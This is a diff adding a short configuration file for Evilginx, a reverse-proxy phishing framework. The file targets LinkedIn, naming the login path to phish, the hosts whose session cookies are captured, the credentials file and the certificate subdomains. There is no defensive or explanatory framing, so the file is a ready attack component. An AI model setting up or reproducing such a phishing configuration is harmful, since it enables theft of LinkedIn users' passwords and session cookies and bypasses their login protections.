@@ -1,0 +1,12 @@
+[site]
+name=linkedin
+site_conf=["www.linkedin.com.conf"]
+creds_conf=linkedin.creds
+phish_subdomains=["www"]
+phish_paths=["/uas/login"]
+target_hosts=["www.linkedin.com"]
+cookie_hosts=["linkedin.com"]
+redir_arg=rc
+success_arg=rd
+log_name=evilginx-linkedin.log
+cert_subdomains=["www"]
